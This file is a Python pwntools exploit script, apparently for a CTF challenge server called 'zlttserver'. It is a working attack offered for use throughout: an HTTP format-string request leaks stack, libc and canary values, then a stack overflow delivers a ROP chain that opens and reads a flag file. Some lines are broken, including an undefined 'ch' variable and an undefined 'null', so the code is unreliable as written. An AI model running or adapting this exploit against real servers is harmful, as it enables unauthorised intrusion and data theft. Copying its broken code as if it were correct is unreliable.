# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './zlttserver_no_patch'
os.system('chmod +x %s'%binary)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 0
if DEBUG:
    libc = elf.libc
    p = process(binary)
else:
    host = '0.0.0.0'
    port = '10000'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def cmd(num):
    sla(':',num)

# one_gad = one_gadget(libc.path)

def attack():
    
    se('GET /%14$p,%19$p,%43$p HTTP')
    ru('0x')
    stack_addr = rint(12)
    ru('0x')
    libc.address = rint(12) - 0xa8b2f
    ru('0x')
    canary = rint(16)
    
    read_addr = libc.sym['read']
    open_addr = libc.sym['open']
    puts_addr = libc.sym['puts']
    pop_rax_ret = libc.search(asm('pop rax; ret')).next()
    pop_rdi_ret = libc.search(asm('pop rdi; ret')).next()
    pop_rsi_ret = libc.search(asm('pop rsi; ret')).next()
    pop_rdx_ret = libc.search(asm('pop rdx; ret')).next()
    pop_rdx_pop_rbx_ret = libc.search(asm('pop rdx ; pop rbx ; ret')).next()
    ret = pop_rdi_ret + 1
    
    flag_addr = stack_addr + 0x100 + 0x100
    chain = flat(
        pop_rdi_ret , 3 , pop_rsi_ret , 0 , open_addr,
        pop_rdi_ret , 3 , pop_rsi_ret , flag_addr , pop_rdx_pop_rbx_ret , 0x100 , 0 , read_addr,
    ).ljust(0x100,'\x00') + 'flag\x00'
    
    # dbg('free')

    p = remote(host,port)
    payload  = 'a'*0x100
    payload += flat(
        stack_addr - 0x100,
        canary , 
        0,
    )
    payload += ch

    se(payload)
    # ru('head:')

    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   zlttserver-exp.py
@Time    :   2022/02/15 14:04:29
@Author  :   Niyah 
'''